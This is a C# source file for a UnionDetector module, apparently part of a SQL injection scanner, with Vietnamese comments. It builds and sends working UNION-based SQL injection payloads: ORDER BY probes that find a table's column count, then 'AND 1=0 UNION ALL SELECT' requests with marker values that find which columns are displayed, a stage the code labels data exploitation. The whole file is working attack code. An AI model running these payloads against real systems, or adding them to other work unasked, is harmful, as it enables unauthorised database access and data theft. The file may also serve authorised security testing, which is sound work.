using SQLiScanner.Models;
using SQLiScanner.Models.Enums;
using SQLiScanner.Services;
using SQLiScanner.Utility;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Http;
using System.Text;
using System.Threading.Tasks;

namespace SQLiScanner.Modules
{
    public class UnionDetector
    {
        private readonly IRequestDispatcher _requestService;
        public UnionDetector(IRequestDispatcher requestService)
        {
            _requestService = requestService;
        }

        public async Task<int> GetColumnCountAsync(
            CrawlResult target, 
            AnalyzingResult detectedData, 
            PayloadState trackingState,
            CancellationToken cancellationToken = default)
        {
            trackingState.UpdateStatus(ScanStatus.CheckingColumnCount, "Đang dò số cột bằng ORDER BY...");

            int baseLength = await GetResponseLengthAsync(target, detectedData.Route.OriginalValue, detectedData.Route, cancellationToken);

            if (baseLength <= 0) return -1;

            double columnErrorThreshold = target.PageTolerance * 4.0;
            if (columnErrorThreshold < 0.15) columnErrorThreshold = 0.15;
            if (columnErrorThreshold > 0.40) columnErrorThreshold = 0.40;

            int low = 1;
            int high = 10;
            bool foundUpperBound = false;

            // tránh vòng lặp vô tận
            while (high <= 200)
            {
                if (cancellationToken.IsCancellationRequested) return -1;

                string payload = $"{detectedData.Route.OriginalValue}{detectedData.WorkingPrefix} ORDER BY {high}{detectedData.WorkingSuffix}";
                int currentLength = await GetResponseLengthAsync(target, payload, detectedData.Route, cancellationToken);
                bool isError = Math.Abs(currentLength - baseLength) > baseLength * columnErrorThreshold;

                trackingState.UpdateStatus(ScanStatus.CheckingColumnCount, $"[Exponential] Kiểm tra ORDER BY {high}...");

                if (isError)
                {
                    foundUpperBound = true;
                    break; // Phát hiện lỗi -> high chính là cận trên
                }
                else
                {
                    low = high; // Cập nhật cận dưới bằng mốc thành công gần nhất
                    high *= 2;  // Nhân đôi cận trên
                }
            }

            if (!foundUpperBound && high > 200)
            {
                high = 200;
            }

            int bestFit = -1;

            while (low <= high)
            {
                if (cancellationToken.IsCancellationRequested) return -1;

                int mid = (low + high) / 2;
                trackingState.UpdateStatus(ScanStatus.CheckingColumnCount, $"[Binary] Thử ORDER BY {mid} (Phạm vi: {low} - {high})...");

                string payload = $"{detectedData.Route.OriginalValue}{detectedData.WorkingPrefix} ORDER BY {mid}{detectedData.WorkingSuffix}";
                int currentLength = await GetResponseLengthAsync(target, payload, detectedData.Route, cancellationToken);
                bool isError = Math.Abs(currentLength - baseLength) > baseLength * columnErrorThreshold;

                if (isError)
                {
                    // Gặp lỗi: Số cột thực tế nhỏ hơn mid -> Thu hẹp tìm kiếm về nửa bên trái
                    high = mid - 1;
                }
                else
                {
                    // Thành công: Số cột thực tế lớn hơn hoặc bằng mid
                    bestFit = mid;  // Lưu lại giá trị khả thi nhất tính đến thời điểm hiện tại
                    low = mid + 1;  // Tiếp tục tìm xem có mốc cột nào lớn hơn nữa không ở nửa bên phải
                }
            }

            return bestFit; // Trả về số cột lớn nhất không gây ra lỗi cấu trúc trang
        }

        public async Task<List<int>> GetVisibleColumnsAsync(
            CrawlResult target, 
            AnalyzingResult detectedData, 
            int colCount,
            PayloadState trackingState,
            CancellationToken cancellationToken = default)
        {
            trackingState.UpdateStatus(ScanStatus.ExploitingData, $"Đang tìm cột Text trong {colCount} cột...");
            List<int> visibleCols = new List<int>();
            string fromTable = detectedData.DatabaseType == DatabaseType.Oracle ? " FROM DUAL" : "";

            //string originalValue = target.Params.TryGetValue(detectedData.VulnerableParam, out var bodyVal)
            //    ? bodyVal
            //    : (System.Web.HttpUtility.ParseQueryString(target.RawQueryString)[detectedData.VulnerableParam] ?? "");

            string[] payloadParts = new string[colCount];
            for (int i = 0; i < colCount; i++)
            {
                trackingState.UpdateStatus(ScanStatus.ExploitingData, $"Đang thử inject cột {i + 1}/{colCount}...");
                for (int j = 0; j < colCount; j++) payloadParts[j] = "NULL";

                string magicTag = $"99{i + 1:D2}"; // VD: 9901
                payloadParts[i] = $"'{magicTag}'";

                string unionPart = string.Join(",", payloadParts);
                string payload = $"{detectedData.Route.OriginalValue}{detectedData.WorkingPrefix} AND 1=0 UNION ALL SELECT {unionPart}{fromTable}{detectedData.WorkingSuffix}";

                try
                {
                    // Ở đây ta cần HTML string để tìm text '9901'
                    string? html = await SendPayloadGetStringAsync(target, payload, detectedData.Route, cancellationToken);

                    if (!string.IsNullOrEmpty(html) && html.Contains(magicTag))
                    {
                        visibleCols.Add(i + 1);
                    }
                }
                catch {}
            }

            return visibleCols;
        }

        #region Các hàm phụ trợ
        private async Task<int> GetResponseLengthAsync(
            CrawlResult target, string payload, InjectionRoute route, CancellationToken cancellationToken = default)
        {
            try
            {
                var (_, bytes, _, _, _) = await _requestService.RequestAsync(target, payload, route, cancellationToken);
                return bytes == null ? -1 : bytes.Length;
            }
            catch { return -1; }
        }

      
        private async Task<string?> SendPayloadGetStringAsync(
            CrawlResult target, string payload, InjectionRoute route, CancellationToken cancellationToken = default)
        {
            try
            {
                var (_, bytes, _, _, _) = await _requestService.RequestAsync(target, payload, route, cancellationToken);
                return bytes == null ? "" : System.Text.Encoding.UTF8.GetString(bytes);
            }
            catch { return ""; }
        }
        #endregion
    }
}